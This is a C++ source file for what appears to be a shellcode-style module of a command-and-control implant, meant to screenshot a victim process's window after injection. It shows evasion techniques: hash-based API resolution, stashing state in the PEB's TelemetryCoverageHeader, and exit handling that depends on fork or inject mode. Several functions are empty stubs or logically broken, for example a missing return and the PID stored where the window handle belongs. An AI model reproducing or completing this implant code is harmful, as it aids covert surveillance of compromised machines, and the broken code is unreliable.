#include <General.hpp>

auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
    UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
    UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );
    
    Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
    Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

    Instance->Win32.NtClose = (decltype(Instance->Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

    Instance->Win32.LoadLibraryA     = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));
    Instance->Win32.GetModuleHandleA = (decltype(Instance->Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));

    Instance->Win32.NtProtectVirtualMemory = (decltype(Instance->Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));

    Instance->Win32.RtlAllocateHeap   = (decltype(Instance->Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
    Instance->Win32.RtlReAllocateHeap = (decltype(Instance->Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
    Instance->Win32.RtlFreeHeap       = (decltype(Instance->Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));
    Instance->Win32.GetConsoleWindow        = (decltype(Instance->Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
    Instance->Win32.AllocConsoleWithOptions = (decltype(Instance->Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
    Instance->Win32.FreeConsole             = (decltype(Instance->Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

    Instance->Win32.CreateFileA         = (decltype(Instance->Win32.CreateFileA))LoadApi(Kernel32, HashStr("CreateFileA"));
    Instance->Win32.CreatePipe          = (decltype(Instance->Win32.CreatePipe))LoadApi(Kernel32, HashStr("CreatePipe"));
    Instance->Win32.CreateNamedPipeA    = (decltype(Instance->Win32.CreateNamedPipeA))LoadApi(Kernel32, HashStr("CreateNamedPipeA"));
    Instance->Win32.ConnectNamedPipe    = (decltype(Instance->Win32.ConnectNamedPipe))LoadApi(Kernel32, HashStr("ConnectNamedPipe"));
    Instance->Win32.DisconnectNamedPipe = (decltype(Instance->Win32.DisconnectNamedPipe))LoadApi(Kernel32, HashStr("DisconnectNamedPipe"));
    Instance->Win32.FlushFileBuffers    = (decltype(Instance->Win32.FlushFileBuffers))LoadApi(Kernel32, HashStr("FlushFileBuffers"));
    Instance->Win32.ReadFile            = (decltype(Instance->Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
    Instance->Win32.WriteFile           = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
    Instance->Win32.SetStdHandle        = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
    Instance->Win32.GetStdHandle        = (decltype(Instance->Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

    Instance->Win32.GlobalAlloc  = (decltype(Instance->Win32.GlobalAlloc))LoadApi(Kernel32, HashStr("GlobalAlloc"));
    Instance->Win32.GlobalLock   = (decltype(Instance->Win32.GlobalLock))LoadApi(Kernel32, HashStr("GlobalLock"));
    Instance->Win32.GlobalUnlock = (decltype(Instance->Win32.GlobalUnlock))LoadApi(Kernel32, HashStr("GlobalUnlock"));
    Instance->Win32.GlobalFree   = (decltype(Instance->Win32.GlobalFree))LoadApi(Kernel32, HashStr("GlobalFree"));

    Instance->Win32.GetCurrentProcessId   = (decltype(Instance->Win32.GetCurrentProcessId))LoadApi(Kernel32, HashStr("GetCurrentProcessId"));
    Instance->Win32.ProcessIdToSessionId   = (decltype(Instance->Win32.ProcessIdToSessionId))LoadApi(Kernel32, HashStr("ProcessIdToSessionId"));
    Instance->Win32.GetHandleInformation   = (decltype(Instance->Win32.GetHandleInformation))LoadApi(Kernel32, HashStr("GetHandleInformation"));
    Instance->Win32.RtlLookupFunctionEntry = (decltype(Instance->Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
    Instance->Win32.RtlUserThreadStart     = (decltype(Instance->Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
    Instance->Win32.BaseThreadInitThunk    = (decltype(Instance->Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));

    Instance->Win32.RtlExitUserThread  = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
    Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
}

auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
    UPTR User32 = LoadModule( HashStr( "user32.dll" ) );
    UPTR Gdi32  = LoadModule( HashStr( "gdi32.dll" ) );

    if ( ! User32 ) User32 = (UPTR)Instance->Win32.LoadLibraryA( "user32.dll" );
    if ( ! Gdi32  ) Gdi32  = (UPTR)Instance->Win32.LoadLibraryA( "gdi32.dll" );

    Instance->Win32.CreateDCA = (decltype(Instance->Win32.CreateDCA))LoadApi( Gdi32, HashStr( "CreateDCA" ) );
    Instance->Win32.GetDeviceCaps = (decltype(Instance->Win32.GetDeviceCaps))LoadApi(Gdi32, HashStr("GetDeviceCaps"));
    Instance->Win32.DeleteDC = (decltype(Instance->Win32.DeleteDC))LoadApi(Gdi32, HashStr("DeleteDC"));
    Instance->Win32.GetObjectA = (decltype(Instance->Win32.GetObjectA))LoadApi(Gdi32, HashStr("GetObjectA"));
    Instance->Win32.GetStockObject = (decltype(Instance->Win32.GetStockObject))LoadApi(Gdi32, HashStr("GetStockObject"));
    Instance->Win32.GetDC = (decltype(Instance->Win32.GetDC))LoadApi(User32, HashStr("GetDC"));
    Instance->Win32.ReleaseDC = (decltype(Instance->Win32.ReleaseDC))LoadApi(User32, HashStr("ReleaseDC"));
    Instance->Win32.CreateCompatibleDC = (decltype(Instance->Win32.CreateCompatibleDC))LoadApi(Gdi32, HashStr("CreateCompatibleDC"));
    Instance->Win32.CreateCompatibleBitmap = (decltype(Instance->Win32.CreateCompatibleBitmap))LoadApi(Gdi32, HashStr("CreateCompatibleBitmap"));
    Instance->Win32.SelectObject = (decltype(Instance->Win32.SelectObject))LoadApi(Gdi32, HashStr("SelectObject"));
    Instance->Win32.PrintWindow = (decltype(Instance->Win32.PrintWindow))LoadApi(User32, HashStr("PrintWindow"));
    Instance->Win32.BitBlt = (decltype(Instance->Win32.BitBlt))LoadApi(Gdi32, HashStr("BitBlt"));
    Instance->Win32.ShowWindow = (decltype(Instance->Win32.ShowWindow))LoadApi(User32, HashStr("ShowWindow"));
    Instance->Win32.SetWindowLongA = (decltype(Instance->Win32.SetWindowLongA))LoadApi(User32, HashStr("SetWindowLongA"));
    Instance->Win32.SetLayeredWindowAttributes = (decltype(Instance->Win32.SetLayeredWindowAttributes))LoadApi(User32, HashStr("SetLayeredWindowAttributes"));
    Instance->Win32.UpdateWindow = (decltype(Instance->Win32.UpdateWindow))LoadApi(User32, HashStr("UpdateWindow"));
    Instance->Win32.GetWindowRect = (decltype(Instance->Win32.GetWindowRect))LoadApi(User32, HashStr("GetWindowRect"));

    Instance->Win32.GetWindowPlacement = (decltype(Instance->Win32.GetWindowPlacement))LoadApi(User32, HashStr("GetWindowPlacement"));
    Instance->Win32.GetWindowThreadProcessId = (decltype(Instance->Win32.GetWindowThreadProcessId))LoadApi(User32, HashStr("GetWindowThreadProcessId"));
    Instance->Win32.EnumWindows = (decltype(Instance->Win32.EnumWindows))LoadApi(User32, HashStr("EnumWindows"));
    Instance->Win32.GetSystemMetrics = (decltype(Instance->Win32.GetSystemMetrics))LoadApi(User32, HashStr("GetSystemMetrics"));
    Instance->Win32.SetWindowPos = (decltype(Instance->Win32.SetWindowPos))LoadApi(User32, HashStr("SetWindowPos"));
    Instance->Win32.DeleteObject = (decltype(Instance->Win32.DeleteObject))LoadApi(Gdi32, HashStr("DeleteObject"));
    Instance->Win32.SelectPalette = (decltype(Instance->Win32.SelectPalette))LoadApi(Gdi32, HashStr("SelectPalette"));
    Instance->Win32.RealizePalette = (decltype(Instance->Win32.RealizePalette))LoadApi(Gdi32, HashStr("RealizePalette"));
    Instance->Win32.GetDIBits = (decltype(Instance->Win32.GetDIBits))LoadApi(Gdi32, HashStr("GetDIBits"));
    Instance->Win32.IsWindowVisible = (decltype(Instance->Win32.IsWindowVisible))LoadApi(User32, HashStr("IsWindowVisible"));
}

auto DECLFN CALLBACK EnumWindowsProc(
    HWND   WinHandle, 
    LPARAM Param 
) -> BOOL {
    G_INSTANCE
    
    UPTR* Params    = (UPTR*)Param;
    ULONG ProcessId = Params[0];
    ULONG WindowPid = 0;

    Instance->Win32.GetWindowThreadProcessId( WinHandle, &WindowPid );
    if ( WindowPid == ProcessId && Instance->Win32.IsWindowVisible( WinHandle ) ) {
        Params[1] = (LONG_PTR)WindowPid;
        return FALSE;
    }

    return TRUE;
}

auto DECLFN CaptureScreen( HWND WinHandle ) -> HBITMAP {
    
}

auto DECLFN FindWindowByPid( ULONG Pid ) -> HWND {
    G_INSTANCE

    UPTR EnumWinParam[2] = { 0 };

    Instance->Win32.EnumWindows( 0, (LPARAM)&EnumWinParam );

    EnumWinParam[0] = Pid;
}

auto DECLFN Screenshot( VOID ) -> LONG {

}

EXTERN_C
auto DECLFN Entry( PVOID Parameter ) -> VOID {
    PARSER   Psr      = { 0 };
    INSTANCE Instance = { 0 };

    PVOID ArgBuffer = nullptr;

    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

    Instance.Start      = StartPtr();
    Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
    Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;

    Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)( (UPTR)Instance.Start + Instance.Size );

    LoadEssentials( &Instance );

    Parser::New( &Psr, ArgBuffer );

    LONG  Result = ERROR_SUCCESS;
    ULONG WinPid = Parser::Int32( &Psr );

    LoadAdds( &Instance );

    Result = Screenshot();

    Parser::Destroy( &Psr );

    if ( Instance.Ctx.ExecMethod == KH_METHOD_FORK && Instance.Ctx.ForkCategory == KH_INJECT_SPAWN ) {
        Instance.Win32.RtlExitUserProcess( Result );
    } else {
        Instance.Win32.RtlExitUserThread( Result );
    }
}